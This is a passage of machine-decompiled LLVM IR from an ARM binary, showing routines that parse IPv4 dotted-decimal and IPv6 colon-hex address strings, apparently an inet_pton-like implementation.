  %v1_1b2d8 = trunc i32 %v1_1b2d4 to i16
  store i16 %v1_1b2d8, i16* %v1_1b2d0, align 2
  %v0_1b2dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b2dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b2e0

dec_label_pc_1b2e0:                               ; preds = %dec_label_pc_1b294, %dec_label_pc_1b2d0
  %v1_1b2e8 = phi i32 [ %v1_1b2e8.pre, %dec_label_pc_1b294 ], [ %v0_1b2dc, %dec_label_pc_1b2d0 ]
  %v2_1b2e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b2e4, i32* @r4, align 4
  ret i32 %v1_1b2e8

; uselistorder directives
  uselistorder i32 %v3_1b258, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @function_12d98, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1b2e0, { 1, 0 }
  uselistorder label %dec_label_pc_1b2d0, { 1, 0 }
  uselistorder label %dec_label_pc_1b288, { 1, 0 }
  uselistorder label %dec_label_pc_1b27c, { 1, 0 }
}

define i32 @function_1b2ec(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1b2ec:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1b2f8 = load i32, i32* %arg2, align 4
  %v3_1b2f8 = add i32 %tmp, 4
  %v4_1b2f8 = inttoptr i32 %v3_1b2f8 to i32*
  %v5_1b2f8 = load i32, i32* %v4_1b2f8, align 4
  %v1_1b2fc = add i32 %arg1, 4
  %v2_1b2fc = inttoptr i32 %v1_1b2fc to i32*
  %v3_1b2fc = load i32, i32* %v2_1b2fc, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1b304 = call i32 @function_1cca4(i32 %v3_1b2fc, i32 %tmp, i32 %v2_1b2f8, i32 %v5_1b2f8)
  %v1_1b308 = icmp slt i32* %arg2, null
  br i1 %v1_1b308, label %bb13, label %bb

bb:                                               ; preds = %dec_label_pc_1b2ec
  %v3_1b3105 = load i32, i32* @r4, align 4
  %v4_1b3106 = inttoptr i32 %v3_1b3105 to i32*
  store i32 %v4_1b304, i32* %v4_1b3106, align 4
  %v6_1b3107 = add i32 %v3_1b3105, 4
  %v7_1b3108 = inttoptr i32 %v6_1b3107 to i32*
  store i32 %tmp, i32* %v7_1b3108, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_1b2ec, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1b304, %dec_label_pc_1b2ec ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 19, 20, 17, 18, 16, 15, 14, 21, 22, 23, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_1b328(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b328:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1b328 = load i32, i32* @r4, align 4
  %v6_1b328 = load i32, i32* @r5, align 4
  %v15_1b328 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1b340 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1b340, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1b3b81 = load i32, i32* @r0, align 4
  %v1_1b3b82 = inttoptr i32 %v0_1b3b81 to i8*
  %v2_1b3b83 = load i8, i8* %v1_1b3b82, align 1
  %v3_1b3b84 = zext i8 %v2_1b3b83 to i32
  store i32 %v3_1b3b84, i32* @r3, align 4
  %v2_1b3bc5 = icmp eq i8 %v2_1b3b83, 0
  store i1 %v2_1b3bc5, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b3bc5, label %dec_label_pc_1b3c8, label %dec_label_pc_1b358

dec_label_pc_1b358:                               ; preds = %dec_label_pc_1b328, %dec_label_pc_1b3b8.backedge
  %v0_1b35c = phi i32 [ %v0_1b3b8, %dec_label_pc_1b3b8.backedge ], [ %v0_1b3b81, %dec_label_pc_1b328 ]
  %v0_1b394 = phi i32 [ %v3_1b3b8, %dec_label_pc_1b3b8.backedge ], [ %v3_1b3b84, %dec_label_pc_1b328 ]
  %v2_1b368.in = phi i32 [ %v3_1b3b8, %dec_label_pc_1b3b8.backedge ], [ %v3_1b3b84, %dec_label_pc_1b328 ]
  %v2_1b368 = add nsw i32 %v2_1b368.in, -48
  %v2_1b358 = icmp ugt i32 %v2_1b368, 8
  %v7_1b358 = icmp eq i32 %v2_1b368, 9
  store i1 %v7_1b358, i1* %cpsr_z.global-to-local, align 1
  %v1_1b35c = add i32 %v0_1b35c, 1
  store i32 %v1_1b35c, i32* %r0.global-to-local, align 4
  %v2_1b360 = xor i1 %v7_1b358, true
  %v3_1b360 = and i1 %v2_1b358, %v2_1b360
  br i1 %v3_1b360, label %dec_label_pc_1b394, label %dec_label_pc_1b364

dec_label_pc_1b364:                               ; preds = %dec_label_pc_1b358
  %v0_1b364 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b364 = inttoptr i32 %v0_1b364 to i8*
  %v2_1b364 = load i8, i8* %v1_1b364, align 1
  %v3_1b364 = zext i8 %v2_1b364 to i32
  %v0_1b368 = load i32, i32* %r7.global-to-local, align 4
  %v3_1b368 = mul i32 %v0_1b368, %v3_1b364
  %v4_1b368 = add i32 %v3_1b368, %v2_1b368
  store i32 %v4_1b368, i32* @r3, align 4
  %v2_1b36c = icmp ugt i32 %v4_1b368, 254
  %v7_1b36c = icmp eq i32 %v4_1b368, 255
  store i1 %v7_1b36c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b370 = xor i1 %v7_1b36c, true
  %v3_1b370 = and i1 %v2_1b36c, %v2_1b370
  br i1 %v3_1b370, label %dec_label_pc_1b3ec, label %dec_label_pc_1b374

dec_label_pc_1b374:                               ; preds = %dec_label_pc_1b364
  %v0_1b374 = load i32, i32* @lr, align 4
  %v2_1b374 = icmp eq i32 %v0_1b374, 0
  store i1 %v2_1b374, i1* %cpsr_z.global-to-local, align 1
  %v1_1b378 = trunc i32 %v4_1b368 to i8
  store i8 %v1_1b378, i8* %v1_1b364, align 1
  %v0_1b37c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b37c, label %dec_label_pc_1b380, label %dec_label_pc_1b3b8.backedge

dec_label_pc_1b380:                               ; preds = %dec_label_pc_1b374
  %v0_1b380 = load i32, i32* @ip, align 4
  %v1_1b380 = add i32 %v0_1b380, 1
  store i32 %v1_1b380, i32* @ip, align 4
  %v7_1b384 = icmp eq i32 %v1_1b380, 4
  store i1 %v7_1b384, i1* %cpsr_z.global-to-local, align 1
  %v0_1b388 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1b388, i32* @lr, align 4
  %v8_1b38c = icmp sgt i32 %v1_1b380, 4
  br i1 %v8_1b38c, label %dec_label_pc_1b3ec, label %dec_label_pc_1b3b8.backedge

dec_label_pc_1b394:                               ; preds = %dec_label_pc_1b358
  %v7_1b394 = icmp eq i32 %v0_1b394, 46
  %v1_1b39c = load i32, i32* @lr, align 4
  %v2_1b39c = urem i32 %v1_1b39c, 2
  %storemerge12 = select i1 %v7_1b394, i32 %v2_1b39c, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1b3a0 = icmp eq i32 %storemerge12, 0
  store i1 %v2_1b3a0, i1* %cpsr_z.global-to-local, align 1
  %v0_1b3a4 = load i32, i32* @r5, align 4
  store i32 %v0_1b3a4, i32* @lr, align 4
  br i1 %v2_1b3a0, label %dec_label_pc_1b3ec, label %dec_label_pc_1b3ac

dec_label_pc_1b3ac:                               ; preds = %dec_label_pc_1b394
  %v0_1b3ac = load i32, i32* @ip, align 4
  %v7_1b3ac = icmp eq i32 %v0_1b3ac, 4
  store i1 %v7_1b3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b3ac, label %dec_label_pc_1b3ec, label %dec_label_pc_1b3b4

dec_label_pc_1b3b4:                               ; preds = %dec_label_pc_1b3ac
  %v1_1b3b4 = trunc i32 %v0_1b3a4 to i8
  %v2_1b3b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1b3b4 = add i32 %v2_1b3b4, 1
  %v4_1b3b4 = inttoptr i32 %v3_1b3b4 to i8*
  store i8 %v1_1b3b4, i8* %v4_1b3b4, align 1
  %v5_1b3b4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b3b4 = add i32 %v5_1b3b4, 1
  store i32 %v6_1b3b4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b3b8.backedge

dec_label_pc_1b3b8.backedge:                      ; preds = %dec_label_pc_1b3b4, %dec_label_pc_1b374, %dec_label_pc_1b380
  %v0_1b3b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b3b8 = inttoptr i32 %v0_1b3b8 to i8*
  %v2_1b3b8 = load i8, i8* %v1_1b3b8, align 1
  %v3_1b3b8 = zext i8 %v2_1b3b8 to i32
  store i32 %v3_1b3b8, i32* @r3, align 4
  %v2_1b3bc = icmp eq i8 %v2_1b3b8, 0
  store i1 %v2_1b3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b3bc, label %dec_label_pc_1b3b8.dec_label_pc_1b3c8_crit_edge, label %dec_label_pc_1b358

dec_label_pc_1b3b8.dec_label_pc_1b3c8_crit_edge:  ; preds = %dec_label_pc_1b3b8.backedge
  %v0_1b3c8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1b3c8

dec_label_pc_1b3c8:                               ; preds = %dec_label_pc_1b3b8.dec_label_pc_1b3c8_crit_edge, %dec_label_pc_1b328
  %v0_1b3c8 = phi i32 [ %v0_1b3c8.pre, %dec_label_pc_1b3b8.dec_label_pc_1b3c8_crit_edge ], [ 0, %dec_label_pc_1b328 ]
  %v7_1b3c8 = icmp eq i32 %v0_1b3c8, 3
  store i1 %v7_1b3c8, i1* %cpsr_z.global-to-local, align 1
  %v7_1b3cc = icmp slt i32 %v0_1b3c8, 4
  br i1 %v7_1b3cc, label %dec_label_pc_1b3ec, label %dec_label_pc_1b3d0

dec_label_pc_1b3d0:                               ; preds = %dec_label_pc_1b3c8
  %v0_1b3d0 = load i32, i32* @r4, align 4
  store i32 %v0_1b3d0, i32* @r0, align 4
  store i32 %v2_1b340, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1b3dc = call i32 @function_14000()
  br label %dec_label_pc_1b3ec

dec_label_pc_1b3ec:                               ; preds = %dec_label_pc_1b364, %dec_label_pc_1b380, %dec_label_pc_1b394, %dec_label_pc_1b3ac, %dec_label_pc_1b3c8, %dec_label_pc_1b3d0
  %storemerge = phi i32 [ 1, %dec_label_pc_1b3d0 ], [ 0, %dec_label_pc_1b3c8 ], [ 0, %dec_label_pc_1b3ac ], [ 0, %dec_label_pc_1b394 ], [ 0, %dec_label_pc_1b380 ], [ 0, %dec_label_pc_1b364 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1b328, i32* @r4, align 4
  store i32 %v6_1b328, i32* @r5, align 4
  store i32 %v15_1b328, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1b3c8, { 1, 0 }
  uselistorder i32 %v3_1b3b8, { 2, 1, 0 }
  uselistorder i32 %v0_1b3b8, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1b368, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_1b3ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b3b8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b358, { 1, 0 }
}

define i32 @function_1b3f8(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1b3f8:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %v3_1b3f8 = load i32, i32* @r4, align 4
  %v6_1b3f8 = load i32, i32* @r5, align 4
  %v9_1b3f8 = load i32, i32* @r6, align 4
  %v12_1b3f8 = load i32, i32* @r7, align 4
  %v27_1b3f8 = load i32, i32* @lr, align 4
  %v7_1b404 = icmp eq i32 %arg1, 2
  store i32 180260, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1b404, label %dec_label_pc_1b424, label %dec_label_pc_1b418

dec_label_pc_1b418:                               ; preds = %dec_label_pc_1b3f8
  %v7_1b418 = icmp eq i32 %arg1, 10
  br i1 %v7_1b418, label %dec_label_pc_1b434, label %dec_label_pc_1b5ec

dec_label_pc_1b424:                               ; preds = %dec_label_pc_1b3f8
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1b42c = call i32 @function_1b328(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1b5fc

dec_label_pc_1b434:                               ; preds = %dec_label_pc_1b418
  %v2_1b434 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1b440 = bitcast i32* %stack_var_-56 to i8*
  %v3_1b440 = call i32 @function_13ed0(i8* %v2_1b440, i32 0)
  %v0_1b444 = load i32, i32* @r5, align 4
  %v1_1b444 = inttoptr i32 %v0_1b444 to i8*
  %v2_1b444 = load i8, i8* %v1_1b444, align 1
  %v3_1b444 = zext i8 %v2_1b444 to i32
  store i32 %v3_1b444, i32* %r3.global-to-local, align 4
  %v7_1b448 = icmp eq i8 %v2_1b444, 58
  store i32 %v3_1b440, i32* @r6, align 4
  %v2_1b450 = add i32 %v3_1b440, 16
  store i32 %v2_1b450, i32* %r8.global-to-local, align 4
  br i1 %v7_1b448, label %dec_label_pc_1b458, label %dec_label_pc_1b464

dec_label_pc_1b458:                               ; preds = %dec_label_pc_1b434
  %v1_1b458 = add i32 %v0_1b444, 1
  %v2_1b458 = inttoptr i32 %v1_1b458 to i8*
  %v3_1b458 = load i8, i8* %v2_1b458, align 1
  %v4_1b458 = zext i8 %v3_1b458 to i32
  store i32 %v4_1b458, i32* %r3.global-to-local, align 4
  store i32 %v1_1b458, i32* @r5, align 4
  %v7_1b45c = icmp eq i8 %v3_1b458, 58
  br i1 %v7_1b45c, label %dec_label_pc_1b464, label %dec_label_pc_1b5e4

dec_label_pc_1b464:                               ; preds = %dec_label_pc_1b458, %dec_label_pc_1b434
  %v0_1b470 = phi i32 [ %v1_1b458, %dec_label_pc_1b458 ], [ %v0_1b444, %dec_label_pc_1b434 ]
  store i32 -33632, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1b470, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_23cc4.1083, i32 0, i32 0), i8** %stack_var_-64, align 4
  %v1_1b5483 = inttoptr i32 %v0_1b470 to i8*
  %v2_1b5484 = load i8, i8* %v1_1b5483, align 1
  %v3_1b5485 = zext i8 %v2_1b5484 to i32
  store i32 %v3_1b5485, i32* @r4, align 4
  %v2_1b54c6 = icmp eq i8 %v2_1b5484, 0
  br i1 %v2_1b54c6, label %dec_label_pc_1b554.thread, label %dec_label_pc_1b484

dec_label_pc_1b554.thread:                        ; preds = %dec_label_pc_1b464
  store i32 %v3_1b440, i32* @r4, align 4
  br label %dec_label_pc_1b580

dec_label_pc_1b484:                               ; preds = %dec_label_pc_1b464, %dec_label_pc_1b548.backedge.dec_label_pc_1b484_crit_edge
  %v0_1b488 = phi i32 [ %v3_1b548, %dec_label_pc_1b548.backedge.dec_label_pc_1b484_crit_edge ], [ %v3_1b5485, %dec_label_pc_1b464 ]
  %v2_1b484 = phi i8* [ %v2_1b484.pre, %dec_label_pc_1b548.backedge.dec_label_pc_1b484_crit_edge ], [ getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_23cc4.1083, i32 0, i32 0), %dec_label_pc_1b464 ]
  %v3_1b484 = ptrtoint i8* %v2_1b484 to i32
  store i32 %v3_1b484, i32* @r0, align 4
  %v1_1b488 = or i32 %v0_1b488, 32
  store i32 %v1_1b488, i32* %r1.global-to-local, align 4
  %v3_1b48c = call i32 @function_142f0(i32 %v3_1b484, i32 %v1_1b488)
  %v2_1b490 = icmp eq i32 %v3_1b48c, 0
  %v0_1b494 = load i32, i32* @r5, align 4
  %v1_1b494 = add i32 %v0_1b494, 1
  store i32 %v1_1b494, i32* @r5, align 4
  br i1 %v2_1b490, label %dec_label_pc_1b4b8, label %dec_label_pc_1b49c

dec_label_pc_1b49c:                               ; preds = %dec_label_pc_1b484
  %v2_1b49c = load i8*, i8** %stack_var_-64, align 4
  %v3_1b49c = ptrtoint i8* %v2_1b49c to i32
  store i32 %v3_1b49c, i32* %r2.global-to-local, align 4
  %v2_1b4a0 = sub i32 %v3_1b48c, %v3_1b49c
  %v1_1b4a4 = load i32, i32* @r7, align 4
  %v4_1b4a4 = mul i32 %v1_1b4a4, 16
  %v5_1b4a4 = or i32 %v4_1b4a4, %v2_1b4a0
  store i32 %v5_1b4a4, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1b4a4, 65536
  br i1 %tmp36, label %dec_label_pc_1b544, label %dec_label_pc_1b5e4

dec_label_pc_1b4b8:                               ; preds = %dec_label_pc_1b484
  %v0_1b4b8 = load i32, i32* @r4, align 4
  %v7_1b4b8 = icmp eq i32 %v0_1b4b8, 58
  br i1 %v7_1b4b8, label %dec_label_pc_1b4c0, label %dec_label_pc_1b518

dec_label_pc_1b4c0:                               ; preds = %dec_label_pc_1b4b8
  %v0_1b4c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1b4c0 = icmp eq i32 %v0_1b4c0, 0
  br i1 %v2_1b4c0, label %dec_label_pc_1b4c8, label %dec_label_pc_1b4dc

dec_label_pc_1b4c8:                               ; preds = %dec_label_pc_1b4c0
  %v0_1b4c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1b4c8 = icmp eq i32 %v0_1b4c8, 0
  br i1 %v2_1b4c8, label %dec_label_pc_1b4d0, label %dec_label_pc_1b5e4

dec_label_pc_1b4d0:                               ; preds = %dec_label_pc_1b4c8
  %v0_1b4d0 = load i32, i32* @r6, align 4
  store i32 %v0_1b4d0, i32* %fp.global-to-local, align 4
  store i32 %v1_1b494, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b548.backedge

dec_label_pc_1b4dc:                               ; preds = %dec_label_pc_1b4c0
  %v1_1b4dc = inttoptr i32 %v1_1b494 to i8*
  %v2_1b4dc = load i8, i8* %v1_1b4dc, align 1
  %v3_1b4dc = zext i8 %v2_1b4dc to i32
  store i32 %v3_1b4dc, i32* %r3.global-to-local, align 4
  %v2_1b4e0 = icmp eq i8 %v2_1b4dc, 0
  br i1 %v2_1b4e0, label %dec_label_pc_1b5e4, label %dec_label_pc_1b4e8

dec_label_pc_1b4e8:                               ; preds = %dec_label_pc_1b4dc
  %v0_1b4e8 = load i32, i32* @r6, align 4
  %v1_1b4e8 = add i32 %v0_1b4e8, 2
  store i32 %v1_1b4e8, i32* %r3.global-to-local, align 4
  %v1_1b4ec = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1b4e8, %v1_1b4ec
  br i1 %tmp37, label %dec_label_pc_1b5e4, label %dec_label_pc_1b4f4

dec_label_pc_1b4f4:                               ; preds = %dec_label_pc_1b4e8
  %v0_1b4f4 = load i32, i32* @r7, align 4
  %v3_1b4f4 = udiv i32 %v0_1b4f4, 256
  store i32 %v3_1b4f4, i32* %r2.global-to-local, align 4
  store i32 %v0_1b4e8, i32* %r3.global-to-local, align 4
  %v1_1b4fc = trunc i32 %v3_1b4f4 to i8
  %v3_1b4fc = inttoptr i32 %v0_1b4e8 to i8*
  store i8 %v1_1b4fc, i8* %v3_1b4fc, align 1
  %v4_1b4fc = load i32, i32* %r3.global-to-local, align 4
  %v5_1b4fc = add i32 %v4_1b4fc, 1
  store i32 %v5_1b4fc, i32* @r3, align 4
  %v0_1b500 = load i32, i32* @r7, align 4
  %v1_1b500 = trunc i32 %v0_1b500 to i8
  %v2_1b500 = load i32, i32* @r6, align 4
  %v3_1b500 = add i32 %v2_1b500, 1
  %v4_1b500 = inttoptr i32 %v3_1b500 to i8*
  store i8 %v1_1b500, i8* %v4_1b500, align 1
  store i32 0, i32* @r7, align 4
  %v0_1b508 = load i32, i32* @r3, align 4
  %v1_1b508 = add i32 %v0_1b508, 1
  store i32 %v1_1b508, i32* @r6, align 4
  %v0_1b50c = load i32, i32* @r5, align 4
  store i32 %v0_1b50c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1b548.backedge

dec_label_pc_1b518:                               ; preds = %dec_label_pc_1b4b8
  %v7_1b518 = icmp eq i32 %v0_1b4b8, 46
  br i1 %v7_1b518, label %dec_label_pc_1b520, label %dec_label_pc_1b5e4

dec_label_pc_1b520:                               ; preds = %dec_label_pc_1b518
  %v0_1b520 = load i32, i32* @r6, align 4
  %v1_1b520 = add i32 %v0_1b520, 4
  store i32 %v1_1b520, i32* @r4, align 4
  %v1_1b524 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1b520, %v1_1b524
  br i1 %tmp38, label %dec_label_pc_1b5e4, label %dec_label_pc_1b52c

dec_label_pc_1b52c:                               ; preds = %dec_label_pc_1b520
  %v0_1b52c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1b52c, i32* @r0, align 4
  store i32 %v0_1b520, i32* %r1.global-to-local, align 4
  %v3_1b534 = call i32 @function_1b328(i32 %v0_1b52c, i32 %v0_1b520)
  %v5_1b53c = icmp sgt i32 %v3_1b534, 0
  br i1 %v5_1b53c, label %dec_label_pc_1b52c.dec_label_pc_1b580_crit_edge, label %dec_label_pc_1b5e4

dec_label_pc_1b52c.dec_label_pc_1b580_crit_edge:  ; preds = %dec_label_pc_1b52c
  %v0_1b5c4.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b580

dec_label_pc_1b544:                               ; preds = %dec_label_pc_1b49c
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1b548.backedge

dec_label_pc_1b548.backedge:                      ; preds = %dec_label_pc_1b544, %dec_label_pc_1b4d0, %dec_label_pc_1b4f4
  %v0_1b548 = phi i32 [ %v1_1b494, %dec_label_pc_1b544 ], [ %v1_1b494, %dec_label_pc_1b4d0 ], [ %v0_1b50c, %dec_label_pc_1b4f4 ]
  %v0_1b55412 = phi i32 [ 1, %dec_label_pc_1b544 ], [ 0, %dec_label_pc_1b4d0 ], [ 0, %dec_label_pc_1b4f4 ]
  %v1_1b548 = inttoptr i32 %v0_1b548 to i8*
  %v2_1b548 = load i8, i8* %v1_1b548, align 1
  %v3_1b548 = zext i8 %v2_1b548 to i32
  store i32 %v3_1b548, i32* @r4, align 4
  %v2_1b54c = icmp eq i8 %v2_1b548, 0
  br i1 %v2_1b54c, label %dec_label_pc_1b554, label %dec_label_pc_1b548.backedge.dec_label_pc_1b484_crit_edge

dec_label_pc_1b548.backedge.dec_label_pc_1b484_crit_edge: ; preds = %dec_label_pc_1b548.backedge
  %v2_1b484.pre = load i8*, i8** %stack_var_-64, align 4
  br label %dec_label_pc_1b484

dec_label_pc_1b554:                               ; preds = %dec_label_pc_1b548.backedge
  %v0_1b558.pre = load i32, i32* @r6, align 4
  %v2_1b554 = icmp eq i32 %v0_1b55412, 0
  store i32 %v0_1b558.pre, i32* @r4, align 4
  br i1 %v2_1b554, label %dec_label_pc_1b580, label %dec_label_pc_1b560

dec_label_pc_1b560:                               ; preds = %dec_label_pc_1b554
  %v1_1b560 = add i32 %v0_1b558.pre, 2
  store i32 %v1_1b560, i32* %r3.global-to-local, align 4
  %v1_1b564 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1b560, %v1_1b564
  br i1 %tmp39, label %dec_label_pc_1b5e4, label %dec_label_pc_1b56c

dec_label_pc_1b56c:                               ; preds = %dec_label_pc_1b560
  store i32 %v0_1b558.pre, i32* %r3.global-to-local, align 4
  %v0_1b570 = load i32, i32* @r7, align 4
  %v3_1b570 = udiv i32 %v0_1b570, 256
  store i32 %v3_1b570, i32* %r2.global-to-local, align 4
  %v1_1b574 = trunc i32 %v3_1b570 to i8
  %v3_1b574 = inttoptr i32 %v0_1b558.pre to i8*
  store i8 %v1_1b574, i8* %v3_1b574, align 1
  %v4_1b574 = load i32, i32* %r3.global-to-local, align 4
  %v5_1b574 = add i32 %v4_1b574, 1
  store i32 %v5_1b574, i32* @r3, align 4
  %v0_1b578 = load i32, i32* @r7, align 4
  %v1_1b578 = trunc i32 %v0_1b578 to i8
  %v2_1b578 = load i32, i32* @r6, align 4
  %v3_1b578 = add i32 %v2_1b578, 1
  %v4_1b578 = inttoptr i32 %v3_1b578 to i8*
  store i8 %v1_1b578, i8* %v4_1b578, align 1
  %v0_1b57c = load i32, i32* @r3, align 4
  %v1_1b57c = add i32 %v0_1b57c, 1
  store i32 %v1_1b57c, i32* @r4, align 4
  br label %dec_label_pc_1b580

dec_label_pc_1b580:                               ; preds = %dec_label_pc_1b52c.dec_label_pc_1b580_crit_edge, %dec_label_pc_1b554.thread, %dec_label_pc_1b554, %dec_label_pc_1b56c
  %v0_1b5c4.pre = phi i32 [ %v0_1b5c4.pre.pre, %dec_label_pc_1b52c.dec_label_pc_1b580_crit_edge ], [ %v3_1b440, %dec_label_pc_1b554.thread ], [ %v0_1b558.pre, %dec_label_pc_1b554 ], [ %v1_1b57c, %dec_label_pc_1b56c ]
  %v0_1b580 = load i32, i32* %fp.global-to-local, align 4
  %v2_1b580 = icmp eq i32 %v0_1b580, 0
  %v1_1b5c4.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1b580, label %dec_label_pc_1b5c4, label %dec_label_pc_1b588

dec_label_pc_1b588:                               ; preds = %dec_label_pc_1b580
  %v9_1b588 = icmp eq i32 %v0_1b5c4.pre, %v1_1b5c4.pre
  %v2_1b58c = sub i32 %v0_1b5c4.pre, %v0_1b580
  store i32 %v2_1b58c, i32* @ip, align 4
  br i1 %v9_1b588, label %dec_label_pc_1b5e4, label %dec_label_pc_1b5ac.preheader

dec_label_pc_1b5ac.preheader:                     ; preds = %dec_label_pc_1b588
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1b5ac

dec_label_pc_1b5a0:                               ; preds = %dec_label_pc_1b5ac
  %v2_1b5b4 = sub i32 %v0_1b5c0, %v0_1b5b8
  %v0_1b5a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1b5a0 = add i32 %v0_1b5a0, %v2_1b5b0
  %v3_1b5a0 = inttoptr i32 %v2_1b5a0 to i8*
  %v4_1b5a0 = load i8, i8* %v3_1b5a0, align 1
  %v6_1b5a0 = zext i8 %v4_1b5a0 to i32
  store i32 %v6_1b5a0, i32* @r3, align 4
  %v3_1b5a4 = inttoptr i32 %v2_1b5b4 to i8*
  store i8 %v4_1b5a0, i8* %v3_1b5a4, align 1
  %v0_1b5a8 = load i32, i32* @lr, align 4
  %v1_1b5a8 = trunc i32 %v0_1b5a8 to i8
  %v2_1b5a8 = load i32, i32* %fp.global-to-local, align 4
  %v3_1b5a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b5a8 = add i32 %v3_1b5a8, %v2_1b5a8
  %v5_1b5a8 = inttoptr i32 %v4_1b5a8 to i8*
  store i8 %v1_1b5a8, i8* %v5_1b5a8, align 1
  %v0_1b5ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b5ac.pre = load i32, i32* @ip, align 4
  %v1_1b5b4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b5ac

dec_label_pc_1b5ac:                               ; preds = %dec_label_pc_1b5ac.preheader, %dec_label_pc_1b5a0
  %v0_1b5c0 = phi i32 [ %v1_1b5c4.pre, %dec_label_pc_1b5ac.preheader ], [ %v1_1b5b4.pre, %dec_label_pc_1b5a0 ]
  %v1_1b5b0 = phi i32 [ %v2_1b58c, %dec_label_pc_1b5ac.preheader ], [ %v1_1b5ac.pre, %dec_label_pc_1b5a0 ]
